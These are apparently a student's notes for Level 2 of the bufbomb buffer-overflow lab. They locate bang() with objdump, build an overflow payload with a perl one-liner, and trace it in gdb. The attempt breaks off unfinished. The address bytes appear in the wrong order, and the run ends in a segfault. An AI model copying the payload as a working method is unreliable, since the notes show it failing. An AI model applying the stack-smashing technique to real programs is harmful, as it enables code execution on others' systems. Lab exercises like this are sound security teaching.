Level 2
=======

Goal = inject machine instructions onto the stack, have those instructions execute and then redirect function getbuf() to function bang()

To find the address of function ```bang()``` type:
```unix> objdump -d bufbomb | less```

and use ```f``` to go forward and ```b``` to go backwards until you find bang():

```
08049012 <bang>:
 8049012:       55                      push   %ebp
 8049013:       89 e5                   mov    %esp,%ebp
 8049015:       83 ec 18                sub    $0x18,%esp
 8049018:       a1 ec c1 04 08          mov    0x804c1ec,%eax
 804901d:       3b 05 e4 c1 04 08       cmp    0x804c1e4,%eax
 8049023:       75 1e                   jne    8049043 <bang+0x31>
 8049025:       89 44 24 04             mov    %eax,0x4(%esp)
 ... # other stuff we don't care about for now
 ```
<b>write down the address of bang(). Mine is 08049012</b>

Now type:

```
unix> perl -e 'print "AA "x44, "08 04 90 12 " ' > hexlevel2
unix> ./hex2raw < hexlevel2 > raw
unix> gdb bufbomb
(gdb) break getbuf
(gdb) run -u quinnliu < raw
```

Now use the gdb examine command ```x``` to locate the address and the value held for the variable ```global_value``` by typing:

```
(gdb) x/x &global_value
```

Gives you:

```
(gdb) x/x &global_value
0x804c1ec <global_value>:       0x00000000
```

Now break bang() and show disassembly:
```
(gdb) break bang
(gdb) cont
(gdb) disas
```

Break bang() returns 0x08049018????????????????

(gdb) cont
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x18900408 in ?? ()



